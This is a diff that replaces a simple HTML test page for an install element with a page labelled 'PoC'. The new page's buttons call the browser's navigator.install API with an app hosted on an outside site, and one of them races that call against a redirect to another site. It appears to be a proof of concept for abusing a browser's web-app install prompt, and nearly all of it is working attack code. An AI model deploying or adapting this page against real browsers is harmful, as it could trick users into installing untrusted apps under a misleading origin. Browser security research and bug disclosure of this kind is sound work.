@@ -1,15 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <title>Test one element</title>
-  </head>
-  <body>
-    <p>Executes:</p>
-    <pre><code>
-      &lt;install&gt;&lt;/install&gt;
-    </code></pre>
-    <install></install>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <title>PoC</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+    
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+    
+      button {
+        padding: 28px 24px;
+        font-size: 22px;
+        font-weight: 600;
+        border-radius: 14px;
+        border: none;
+        cursor: pointer;
+      }
+    
+      .container {
+        display: flex;
+        flex-direction: column;
+        gap: 24px;
+        width: 420px;
+        text-align: center;
+      }
+    
+      .grant {
+        background: #2563eb;
+        color: white;
+        box-shadow: 0 10px 30px rgba(37, 99, 235, 0.35);
+      }
+    
+      .execute {
+        background: #bb0606;
+        color: white;
+        box-shadow: 0 10px 30px rgba(220, 38, 38, 0.35);
+      }
+    </style>
+    </head>
+
+    <body>
+    <div class="container">
+      <button class="grant" onclick="grantPermissions()">
+        Grant permissions
+      </button>
+    
+      <button class="execute" onclick="executePoC()">
+        Execute PoC
+      </button>
+    </div>
+    
+    <script>
+      const install_url = "https://diek.us/bubble/";
+      const manifest_id = "https://diek.us/bubble/index.html";
+
+      const grantPermissions = async () => {
+        await navigator.install(install_url, "none");
+      }
+
+      const executePoC = async () => {
+        setTimeout(() => {
+          location = "https://www.google.com/";
+        }, 1);
+        await navigator.install(install_url, manifest_id);
+      }
+    </script>
+    </body>
 </html>
